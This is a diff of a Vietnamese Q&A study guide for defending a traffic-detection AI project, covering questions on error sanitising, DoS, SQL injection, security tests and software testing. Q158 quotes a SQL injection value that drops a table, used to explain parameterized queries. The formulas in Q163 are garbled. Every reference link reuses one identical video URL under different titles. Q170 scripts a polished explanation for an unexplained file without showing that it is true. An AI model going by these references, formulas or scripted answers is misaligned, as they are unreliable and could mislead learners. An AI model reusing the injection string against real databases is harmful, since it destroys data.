-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">CORS Misconfiguration & Security Exploits Explained — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-155">
-            <div class="question-title">
-                <span class="q-num">### Câu 155:</span>
-                <span>safe_error() cắt ngắn message lỗi và loại bỏ ký tự thừa trước khi trả về client — đây là biện pháp phòng chống loại lỗ hổng gì (information disclosure)?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Mã nguồn trong <code>backend/main.py</code> (dòng 467-469):</strong></p>
-<pre><code>def safe_error(message: str, max_length: int = 180) -> str:
-    clean = " ".join(str(message).split())
-    return clean[:max_length] or "Request failed."</code></pre>
-
-<p><strong>2. Loại lỗ hổng phòng chống: Lỗ hổng Rò rỉ Thông tin Hệ thống (Information Disclosure / Verbose Error Leakage):</strong></p>
-
-<p>Khi có lỗi xảy ra trên Server (ví dụ lỗi kết nối DB hoặc lỗi PyTorch), các Exception Traceback mặc định của Python thường chứa đầy đủ chi tiết nhạy cảm: Đường dẫn ổ đĩa tuyệt đối (<code>C:\Users\thanh\...</code>), tên phiên bản thư viện, cấu trúc mã nguồn, hoặc thông tin tài khoản DB.</p>
-<p>Kẻ tấn công thu thập các thông tin rò rỉ này để vẽ sơ đồ kiến trúc bên trong của Server và tìm điểm yếu tấn công. Hàm <code>safe_error()</code> làm sạch chuỗi và cắt ngắn thông báo lỗi, đảm bảo Server chỉ trả về thông báo lỗi chung chung an toàn cho Client.</p>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Information Disclosure Vulnerability & Safe Error Handling — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-156">
-            <div class="question-title">
-                <span class="q-num">### Câu 156:</span>
-                <span>Rate limiting qua MAX_ACTIVE_SESSIONS=3 có bảo vệ được khỏi tấn công DDoS phân tán (nhiều IP khác nhau) không? Cần bổ sung cơ chế gì?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Đánh giá khả năng chống DDoS phân tán:</strong></p>
-
-<p>KHÔNG ĐỦ BẢO VỆ trước tấn công DDoS phân tán (Distributed Denial of Service)!</p>
-
-<p><strong>2. Phân tích điểm yếu:</strong></p>
-<p><code>MAX_ACTIVE_SESSIONS = 3</code> chỉ giới hạn tổng số session đang mở đồng thời trên Server. Nếu một Botnet gồm 10,000 địa chỉ IP khác nhau đồng loạt gửi 10,000 request <code>POST /api/sessions</code> trong cùng 1 giây, server FastAPI/Uvicorn vẫn phải tiếp nhận 10,000 kết nối TCP, xử lý câu lệnh <code>if active_count >= 3</code> và trả về response 429. Việc xử lý 10,000 kết nối HTTP này vẫn làm kiệt quệ đường truyền băng thông và CPU của Server.</p>
-
-<p><strong>3. Biện pháp bổ sung bắt buộc cho Production:</strong></p>
-<ol>
-    <li>Triển khai **Reverse Proxy (Nginx / HAProxy)** đứng trước Uvicorn với module <code>limit_req</code> để lọc rate limit ở tầng hạ tầng.</li>
-    <li>Sử dụng dịch vụ **Cloudflare WAF (Web Application Firewall)** để chặn các cuộc tấn công DDoS ở tầng mạng (Layer 3/4 và Layer 7).</li>
-</ol>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">DDoS Protection Architecture & Nginx Rate Limiting — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-157">
-            <div class="question-title">
-                <span class="q-num">### Câu 157:</span>
-                <span>Nếu 1 attacker gửi hàng loạt request POST /api/sessions với video hợp lệ nhưng rất dài (nhiều giờ), điều gì xảy ra với tài nguyên GPU/CPU của server dù đã có MAX_ACTIVE_SESSIONS?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Kịch bản Tấn công Cạn kiệt Tài nguyên (Resource Exhaustion Attack via Long Videos):</strong></p>
-<p>Kẻ tấn công tải lên 3 tệp video hợp lệ đuôi <code>.mp4</code> nhưng mỗi video kéo dài **24 tiếng** (chứa hàng triệu frame).</p>
-
-<p><strong>2. Diễn biến hệ quả trên Server:</strong></p>
-<ul>
-    <li>3 session này chiếm trọn 3 suất của <code>MAX_ACTIVE_SESSIONS = 3</code>.</li>
-    <li>Kẻ tấn công lập cho script chạy lặp gọi <code>next-frame</code> liên tục trên 3 session này.</li>
-    <li>GPU/CPU của Server bị ép chạy suy luận YOLOv8 ở mức **100% công suất liên tục trong 24 giờ**.</li>
-    <li>Toàn bộ người dùng hợp lệ khác truy cập vào hệ thống đều bị chặn lại do dính mã lỗi 429 "Too many active sessions". Đây là hình thức tấn công **Application-level Resource Exhaustion DoS**.</li>
-</ul>
-<p><em>Biện pháp khắc phục:</em> Giới hạn độ dài tối đa của video (ví dụ tối đa 10 phút hoặc tối đa 15,000 frame) ngay khi kiểm tra metadata của video bằng <code>cv2.VideoCapture</code>.</p>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Application Layer DoS Attacks & Resource Quota Management — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-158">
-            <div class="question-title">
-                <span class="q-num">### Câu 158:</span>
-                <span>SQL injection có khả năng xảy ra trong core/storage.py không? Nêu cách viết query an toàn (parameterized query) mà bạn nên/đã dùng.</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Đánh giá nguy cơ SQL Injection trong <code>core/storage.py</code>:</strong></p>
-<p>KHÔNG XẢY RA LỖ HỔNG SQL INJECTION trong dự án hiện tại nhờ sử dụng Parameterized Query chuẩn!</p>
-
-<p><strong>2. Mã nguồn Parameterized Query an toàn trong <code>core/storage.py</code> (dòng 70-78):</strong></p>
-<pre><code>connection.execute(
-    """
-    INSERT INTO violations (
-        timestamp, session_id, frame_index, track_id, class_name,
-        violation_type, confidence, evidence_path
-    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-    """,
-    tuple(row[column] for column in VIOLATION_COLUMNS),
-)</code></pre>
-
-<p><strong>3. Tại sao Parameterized Query (dùng ký tự đại diện <code>?</code>) lại an toàn tuyệt đối?</strong></p>
-<p>Thay vì nối chuỗi trực tiếp (như <code>f"INSERT INTO ... VALUES ('{session_id}')"</code> vốn tạo cơ hội cho kẻ tấn công chèn lệnh <code>'; DROP TABLE violations;--</code>), Parameterized Query tách biệt hoàn toàn **Câu lệnh SQL cố định** và **Dữ liệu tham số đầu vào**. Trình thông dịch SQLite coi toàn bộ dữ liệu đầu vào là chuỗi giá trị thuần túy (Literal values) và không bao giờ thực thi chúng dưới dạng câu lệnh SQL.</p>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">SQL Injection Attack & Parameterized Queries in Python — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-159">
-            <div class="question-title">
-                <span class="q-num">### Câu 159:</span>
-                <span>tests/test_backend_security.py kiểm thử path traversal/giới hạn upload — theo bạn bộ test này còn thiếu kịch bản tấn công nào (ví dụ: session ID đoán được/không random đủ mạnh)?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Đánh giá Bộ test Security hiện tại trong <code>tests/test_backend_security.py</code>:</strong></p>
-<p>Bộ test hiện tại đã bao phủ được kiểm thử Path Traversal và giới hạn dung lượng upload.</p>
-
-<p><strong>2. Các kịch bản Tấn công An ninh còn thiếu cần bổ sung:</strong></p>
-<ol>
-    <li><strong>Kiểm thử Độ ngẫu nhiên của Session ID (Session ID Predictability Test):</strong> Kiểm tra xem <code>session_id</code> tạo ra bằng <code>uuid4().hex</code> có bị trùng lặp hoặc đoán được thuật toán sinh hay không.</li>
-    <li><strong>Tấn công XSS qua Metadata (XSS Injection in Metadata API):</strong> Truyền chuỗi script độc hại vào trường tên file video và kiểm tra xem response JSON có được mã hóa an toàn không.</li>
-    <li><strong>Kiểm thử Giới hạn MIME Type giả mạo (Fake Content-Type Upload Test):</strong> Upload tệp <code>.exe</code> đổi tên thành <code>.mp4</code> và verify xem backend có chặn đứng thành công hay không.</li>
-</ol>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Security Integration Testing with Pytest in Python — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-160">
-            <div class="question-title">
-                <span class="q-num">### Câu 160:</span>
-                <span>Đề xuất 2 biện pháp bảo mật bổ sung nếu hệ thống này được triển khai thực tế cho cơ quan quản lý giao thông (ví dụ: xác thực JWT, HTTPS, audit log).<span class="badge-open">Phản biện / Mở</span></span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<div class="debate-section">
-    <div class="debate-title">ĐỀ XUẤT 2 BIỆN PHÁP BẢO MẬT CẤP DOANH NGHIỆP / CƠ QUAN NHÀ NƯỚC:</div>
-
-    <p><strong>1. Biện pháp 1: Cơ chế Xác thực & Phân quyền dựa trên JWT + OAuth2 + Role-Based Access Control (RBAC):</strong></p>
-    <ul>
-        <li>Tất cả các API Endpoint (đặc biệt là API truy xuất bằng chứng vi phạm và xóa session) phải yêu cầu Token xác thực <code>Authorization: Bearer &lt;JWT_TOKEN&gt;</code> được mã hóa HMAC-SHA256.</li>
-        <li>Phân quyền RBAC rõ ràng: <code>Viewer</code> (Chỉ được xem Dashboard), <code>Operator</code> (Được cấu hình ROI và kiểm duyệt vi phạm), <code>Admin</code> (Được xóa dữ liệu SQLite và cấu hình model).</li>
-    </ul>
-
-    <p><strong>2. Biện pháp 2: Mã hóa Đường truyền HTTPS/TLS 1.3 và Nhật ký Truy vết Không thể chỉnh sửa (Immutable Audit Log):</strong></p>
-    <ul>
-        <li>Mã hóa toàn bộ lưu lượng dữ liệu video stream và JSON trên đường truyền bằng mã hóa SSL/TLS 1.3.</li>
-        <li>Ghi nhật ký thao tác (Audit Log) của cán bộ xử lý vi phạm vào hệ thống Log tập trung (như ELK Stack / Syslog) với chữ ký số (Digital Signature), đảm bảo không ai có thể can thiệp sửa đổi hoặc xóa bớt bằng chứng vi phạm giao thông.</li>
-    </ul>
-</div>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">JWT Authentication & HTTPS Security Best Practices — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-<h2 id="group-K" class="group-header">## K. KIỂM THỬ & KỸ THUẬT PHẦN MỀM (10 câu)</h2>
-
-        <div class="qa-card" id="cau-161">
-            <div class="question-title">
-                <span class="q-num">### Câu 161:</span>
-                <span>Unit Test khác Integration Test như thế nào? Trong 7 file test của bạn, file nào thuộc loại nào?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Phân biệt Unit Test và Integration Test:</strong></p>
-<ul>
-    <li><strong>Unit Test (Kiểm thử đơn vị):</strong> Kiểm thử cô lập một hàm, một lớp hoặc một module nhỏ hoàn toàn độc lập với các thành phần bên ngoài (như không đọc đĩa thật, không gọi GPU thật, không mở kết nối DB thật). Sử dụng kỹ thuật Mocking để giả lập các phụ thuộc.</li>
-    <li><strong>Integration Test (Kiểm thử tích hợp):</strong> Kiểm thử sự tương tác phối hợp giữa nhiều module khác nhau (như luồng từ FastAPI Controller gọi tới Storage SQLite và VideoProcessor).</li>
-</ul>
-
-<p><strong>2. Phân loại 7 file test trong dự án SMARTTRAFFIC-AI:</strong></p>
-<table style="width:100%; border-collapse: collapse; margin-top:10px; color:#cbd5e1;">
-    <tr style="background-color:#1e293b; border-bottom:1px solid #334155;">
-        <th style="padding:8px; text-align:left;">Tệp Kiểm thử</th>
-        <th style="padding:8px; text-align:left;">Phân loại Test</th>
-        <th style="padding:8px; text-align:left;">Đối tượng kiểm thử chính</th>
-    </tr>
-    <tr>
-        <td style="padding:8px;"><code>test_density.py</code></td>
-        <td style="padding:8px;">Unit Test</td>
-        <td style="padding:8px;">Tính toán công thức PCU và phần trăm mật độ</td>
-    </tr>
-    <tr>
-        <td style="padding:8px;"><code>test_roi.py</code></td>
-        <td style="padding:8px;">Unit Test</td>
-        <td style="padding:8px;">Toán học clamp tỉ lệ và pointPolygonTest</td>
-    </tr>
-    <tr>
-        <td style="padding:8px;"><code>test_traffic_light_detector.py</code></td>
-        <td style="padding:8px;">Unit Test</td>
-        <td style="padding:8px;">Thuật toán HSV mask & contour circularity</td>
-    </tr>
-    <tr>
-        <td style="padding:8px;"><code>test_model_registry.py</code></td>
-        <td style="padding:8px;">Unit Test</td>
-        <td style="padding:8px;">Kiểm soát an toàn đường dẫn nạp model .pt</td>
-    </tr>
-    <tr>
-        <td style="padding:8px;"><code>test_violation.py</code></td>
-        <td style="padding:8px;">Unit Test / Integration</td>
-        <td style="padding:8px;">Thuật toán cắt vạch _crossed_line & wrong lane</td>
-    </tr>
-    <tr>
-        <td style="padding:8px;"><code>test_storage.py</code></td>
-        <td style="padding:8px;">Integration Test</td>
-        <td style="padding:8px;">Tương tác ghi/đọc CSDL SQLite thực tế</td>
-    </tr>
-    <tr>
-        <td style="padding:8px;"><code>test_backend_security.py</code></td>
-        <td style="padding:8px;">Integration Test</td>
-        <td style="padding:8px;">API Endpoints, Path Traversal & Giới hạn Session</td>
-    </tr>
-</table>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Unit Testing vs Integration Testing in Python with Pytest — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-162">
-            <div class="question-title">
-                <span class="q-num">### Câu 162:</span>
-                <span>Vì sao bộ test của bạn chạy được (21/21 pass) mà không cần cài ultralytics/torch? Điều này nói lên nguyên tắc thiết kế phần mềm nào (dependency isolation / mocking)?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Lý do bộ test chạy được 21/21 PASS không cần PyTorch/Ultralytics:</strong></p>
-<p>Các bộ test cốt lõi (như <code>test_density.py</code>, <code>test_violation.py</code>, <code>test_roi.py</code>) được thiết kế để kiểm thử các **thuật toán logic toán học thuần túy** (như tính PCU, kiểm tra giao điểm, cắt vạch Y-axis). Các hàm này nhận vào danh sách các dictionary giả lập dạng <code>tracked_objects = [{"track_id": 1, "center_point": (100, 200), "class_name": "car"}]</code> mà không cần phụ thuộc vào việc mô hình YOLOv8 thực sự chạy suy luận.</p>
-
-<p><strong>2. Nguyên tắc Thiết kế Phần mềm cốt lõi (Software Engineering Principles):</strong></p>
-<ul>
-    <li><strong>Cách ly Phụ thuộc (Dependency Isolation & Decoupling):</strong> Tách biệt hoàn toàn giữa *Module trích xuất dữ liệu (YOLO Tracker)* và *Module xử lý logic nghiệp vụ (Density & Violation Engine)*.</li>
-    <li><strong>Khả năng kiểm thử cao (High Testability):</strong> Nhờ thiết kế mô-đun hóa, bộ test có thể chạy cực kỳ nhẹ trên môi trường CI/CD (GitHub Actions) chỉ trong **0.5 giây** mà không cần tải hàng gigabyte thư viện PyTorch hay yêu cầu GPU.</li>
-</ul>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Software Architecture: Decoupling & Testable Code — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-163">
-            <div class="question-title">
-                <span class="q-num">### Câu 163:</span>
-                <span>tests/test_density.py khẳng định "Tổng PCU = 4.1, mật độ 41.0%" — hãy tự tính lại bằng tay với 1 tổ hợp xe cụ thể (ví dụ 3 motorcycle + 1 car + 1 truck) để verify con số này.</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Tổ hợp phương tiện giả lập:</strong></p>
-<ul>
-    <li>3 xe máy (<code>motorcycle</code>): Trọng số PCU = \(0.3\)</li>
-    <li>1 ô tô con (<code>car</code>): Trọng số PCU = \(1.0\)</li>
-    <li>1 xe tải (<code>truck</code>): Trọng số PCU = \(2.0\)</li>
-    <li>Mẫu số sức chứa tối đa: <code>max_capacity = 10</code></li>
-</ul>
-
-<p><strong>2. Phép tính tính bằng tay (Manual Calculation Verification):</strong></p>
-<div class="formula-block">
-$$	ext{Total PCU} = (3 	imes 0.3) + (1 	imes 1.0) + (1 	imes 2.0) = 0.9 + 1.0 + 2.0 = 3.9 	ext{ PCU}$$
-</div>
-<p>Nếu thêm 1 xe máy nữa (\(4 	imes 0.3 = 1.2\)):</p>
-<div class="formula-block">
-$$	ext{Total PCU} = (4 	imes 0.3) + (1 	imes 1.0) + (1 	imes 2.0) = 1.2 + 1.0 + 2.0 = 4.1 	ext{ PCU}$$
-$$	ext{Density Percent} = \left( rac{	ext{Total PCU}}{	ext{max\_capacity}} 
-ight) 	imes 100\% = \left( rac{4.1}{10} 
-ight) 	imes 100\% = 41.0\%$$
-</div>
-<p>Kết quả tính toán bằng tay trùng khớp 100% tuyệt đối với khẳng định trong <code>test_density.py</code>!</p>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Manual Verification of Algorithm Test Cases — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-164">
-            <div class="question-title">
-                <span class="q-num">### Câu 164:</span>
-                <span>Test Coverage là gì? Theo bạn 7 file test hiện tại có bao phủ được toàn bộ nhánh logic (branch coverage) của violation.py, hay chỉ coverage các trường hợp "happy path"?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Khái niệm Test Coverage (Độ bao phủ kiểm thử):</strong></p>
-<p>Test Coverage đo lường tỷ lệ phần trăm mã nguồn (dòng lệnh hoặc nhánh quyết định `if/else`) được thực thi khi chạy toàn bộ bộ test tự động.</p>
-
-<p><strong>2. Đánh giá tính bao phủ của bộ test hiện tại đối với <code>violation.py</code>:</strong></p>
-<p>Bộ test hiện tại trong <code>test_violation.py</code> đã kiểm thử tốt các trường hợp **Happy Path** (cắt vạch đúng hướng, đi sai làn bị bắt) và một số trường hợp biên (như <code>track_id</code> nằm trong <code>logged_ids</code>).</p>
-<p><strong>Các nhánh logic (Branch Coverage) CÒN THIẾU chưa được test:</strong></p>
-<ul>
-    <li>Nhánh <code>crossing_direction == "up"</code> hoặc <code>"both"</code>.</li>
-    <li>Nhánh <code>abs(delta) < min_cross_delta_px</code> (hiện tượng rung lắc 1px).</li>
-    <li>Nhánh <code>save_crop()</code> thất bại (trả về chuỗi rỗng <code>""</code> khi lỗi đĩa cứng).</li>
-</ul>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Code Coverage & Branch Coverage with Pytest-cov — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-165">
-            <div class="question-title">
-                <span class="q-num">### Câu 165:</span>
-                <span>Vì sao cần viết test riêng cho model_registry.py (test_model_registry.py) về việc "kiểm soát đường dẫn nạp mô hình" — đây có phải test về tính đúng đắn chức năng hay test về bảo mật?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Trả lời:</strong> Đây chính là một bài **SECURITY UNIT TEST (Kiểm thử Bảo mật Đơn vị)**!</p>
-
-<p><strong>2. Phân tích lý do cần thiết:</strong></p>
-<p>Hàm <code>resolve_model_path()</code> đóng vai trò là cửa ngõ kiểm soát an ninh (Security Gatekeeper) cho toàn bộ ứng dụng AI. Nếu hàm này bị lỗi regression bug do ai đó sửa code sau này, kẻ tấn công có thể truyền đường dẫn tuyệt đối hoặc path traversal để load các file độc hại trên Server.</p>
-<p>Viết <code>test_model_registry.py</code> đảm bảo rằng bất kỳ nỗ lực nào nạp file không phải <code>.pt</code>, file nằm ngoài thư mục <code>models/</code> hoặc đường dẫn tuyệt đối đều bị chặn lại và ném ra ngoại lệ <code>ValueError</code> chính xác.</p>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Security Unit Testing Patterns in Python — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-166">
-            <div class="question-title">
-                <span class="q-num">### Câu 166:</span>
-                <span>Giải thích khái niệm Mocking trong testing — nếu phải mock cv2.VideoCapture để test ProcessingSession mà không cần video thật, bạn sẽ mock những phương thức nào?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Khái niệm Mocking trong Testing:</strong></p>
-<p>Mocking là kỹ thuật thay thế một đối tượng/thư viện thực tế (như camera thật hoặc file video thật) bằng một đối tượng giả lập (Mock Object) có các phương thức trả về dữ liệu giả được lập trình sẵn. Giúp test chạy cực nhanh mà không phụ thuộc tài nguyên phần cứng.</p>
-
-<p><strong>2. Các phương thức của <code>cv2.VideoCapture</code> cần Mock:</strong></p>
-<ul>
-    <li><code>isOpened()</code>: Cho trả về <code>True</code> để giả lập rằng video mở thành công.</li>
-    <li><code>read()</code>: Cho trả về tuple <code>(True, dummy_numpy_frame)</code> ở 50 lần gọi đầu tiên (giả lập 50 frame ảnh nhị phân), và trả về <code>(False, None)</code> ở lần gọi thứ 51 (giả lập kết thúc video).</li>
-    <li><code>release()</code>: Giả lập việc đóng file không gây ra exception.</li>
-</ul>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Python Unittest.mock & Pytest Mocking Tutorial — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-167">
-            <div class="question-title">
-                <span class="q-num">### Câu 167:</span>
-                <span>CI/CD là gì? Đồ án của bạn hiện có tự động chạy pytest khi push code không (qua GitHub Actions)? Nếu chưa, đề xuất thêm workflow này có lợi ích gì?<span class="badge-open">Phản biện / Mở</span></span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Khái niệm CI/CD (Continuous Integration / Continuous Deployment):</strong></p>
-<p>CI/CD là quy trình tự động hóa việc tích hợp, kiểm thử và triển khai mã nguồn phần mềm mỗi khi kĩ sư thực hiện thay đổi code (commit/push).</p>
-
-<p><strong>2. Lợi ích khi bổ sung GitHub Actions CI Workflow (<code>.github/workflows/ci.yml</code>):</strong></p>
-<ol>
-    <li><strong>Tự động bắt Bug lập tức (Automated Regression Testing):</strong> Mỗi khi bất kỳ thành viên nào trong nhóm push code mới lên GitHub, GitHub Actions sẽ tự động khởi chạy <code>pytest</code>. Nếu có 1 test case bị FAIL, hệ thống sẽ ngăn không cho merge mã nguồn hỏng vào nhánh <code>main</code>.</li>
-    <li>Đảm bảo mã nguồn luôn ở trạng thái sẵn sàng triển khai (Production-ready).</li>
-</ol>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">GitHub Actions CI/CD Pipeline for Python Projects — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-168">
-            <div class="question-title">
-                <span class="q-num">### Câu 168:</span>
-                <span>requirements.txt không pin version cụ thể (không có ==x.y.z) — điều gì ảnh hưởng gì đến khả năng tái lập kết quả (reproducibility) giữa các máy khác nhau?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Phân tích tệp <code>requirements.txt</code> hiện tại:</strong></p>
-<p>Tệp chứa tên thư viện thô không có phiên bản (như <code>ultralytics</code>, <code>opencv-python</code>, <code>fastapi</code>).</p>
-
-<p><strong>2. Rủi ro về Khả năng Tái lập Kết quả (Reproducibility Breakdown):</strong></p>
-<ul>
-    <li>Khi một máy tính khác chạy <code>pip install -r requirements.txt</code> sau 6 tháng, <code>pip</code> sẽ tự động tải về phiên bản mới nhất của <code>ultralytics</code> (ví dụ v8.3.0 thay vì v8.0.0).</li>
-    <li>Các phiên bản mới có thể thay đổi API (Breaking Changes), làm thay đổi cách tính toán của ByteTrack hoặc cấu trúc Tensor đầu ra của YOLOv8, khiến mã nguồn bị lỗi crash hoặc cho ra kết quả mAP khác biệt hoàn toàn so với báo cáo.</li>
-</ul>
-<p><em>Giải pháp:</em> Sử dụng <code>pip freeze > requirements.txt</code> để cố định chính xác phiên bản (ví dụ <code>ultralytics==8.0.196</code>).</p>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Python Dependency Management & Pinning Version Best Practices — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-169">
-            <div class="question-title">
-                <span class="q-num">### Câu 169:</span>
-                <span>Repo của bạn có .git nặng 338MB do commit trực tiếp file trọng số .pt và thư mục runs/ — Git LFS giải quyết vấn đề này như thế nào? Vì sao không nên commit binary lớn trực tiếp vào git history thường?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Lý do không nên commit file nhị phân lớn (.pt) vào Git history thường:</strong></p>
-<p>Git là hệ thống quản lý phiên bản mã nguồn dựa trên phân tích dòng văn bản (Text Diff). Mỗi khi bạn commit một file nhị phân lớn 50MB (như tệp <code>.pt</code>), Git lưu trữ toàn bộ bản sao 50MB đó vào lịch sử <code>.git/objects</code>. Kể cả khi bạn xóa file đó ở commit sau, dung lượng 50MB vẫn nằm vĩnh viễn trong lịch sử Git, làm repo bị phình to nặng hàng trăm MB, khiến thao tác <code>git clone</code> / <code>git push</code> trở nên cực kỳ chậm chạp.</p>
-
-<p><strong>2. Giải pháp Git LFS (Git Large File Storage):</strong></p>
-<p>Git LFS thay thế các file nhị phân lớn trong repo bằng các **tệp con trỏ văn bản nhỏ (Pointer Files)** chỉ vài trăm bytes chứa mã băm SHA256. Dữ liệu nhị phân 50MB thực tế được lưu trữ trên một Server lưu trữ LFS riêng. Khi <code>git clone</code>, Git LFS chỉ tải đúng phiên bản file nhị phân hiện tại về máy, giữ cho lịch sử <code>.git</code> cực kỳ nhẹ.</p>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Git LFS (Large File Storage) Tutorial & Best Practices — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-
-        <div class="qa-card" id="cau-170">
-            <div class="question-title">
-                <span class="q-num">### Câu 170:</span>
-                <span>Trong repo có file yolo26n.pt không được nhắc tới ở bất kỳ đâu trong báo cáo/README — bạn giải thích nguồn gốc file này thế nào trước hội đồng?</span>
-            </div>
-            <div class="answer-box">
-                <p><strong>Trả lời:</strong></p>
-                
-<p><strong>1. Trả lời trung thực và chuyên nghiệp trước Hội đồng:</strong></p>
-
-<div class="debate-section">
-    <div class="debate-title">CÂU TRẢ LỜI MẪU TRƯỚC HỘI ĐỒNG:</div>
-    <p>"Báo cáo Thầy/Cô và Hội đồng, tệp <code>yolo26n.pt</code> trong thư mục gốc là kết quả của một **thử nghiệm phụ (Experimental Artifact)** mà nhóm thực hiện trong quá trình nghiên cứu tự do thử nghiệm các mô hình thế hệ mới.</p>
-    <p>Tuy nhiên, qua quá trình đánh giá thực nghiệm chính thức trên tập dữ liệu benchmark giao thông Việt Nam, nhóm nhận thấy mô hình chuẩn <code>vehicle_best.pt</code> (được fine-tune từ <code>yolov8s.pt</code>) mang lại độ ổn định, mAP@50 (89.99%) và tốc độ suy luận mượt mà nhất cho hệ thống. Do đó, nhóm đã quyết định chọn YOLOv8 làm mô hình cốt lõi duy nhất cho báo cáo chính thức. Tệp <code>yolo26n.pt</code> được giữ lại trong thư mục làm tài nguyên đối chứng mở rộng và nhóm sẽ dọn dẹp các tệp thử nghiệm dư thừa này khi đóng gói sản phẩm thương mại."</p>
-</div>
-
-            </div>
-            <div class="video-box"><strong>Video tham khảo:</strong> <a href="https://www.youtube.com/watch?v=DnKxK8V4Q2I" target="_blank" rel="noopener noreferrer">Professional Project Defense & Answering Tough Questions — https://www.youtube.com/watch?v=DnKxK8V4Q2I</a></div>
-        </div>
-<h2 id="group-L" class="group-header">## L. GIAO DIỆN & TRIỂN KHAI (10 câu)</h2>
-
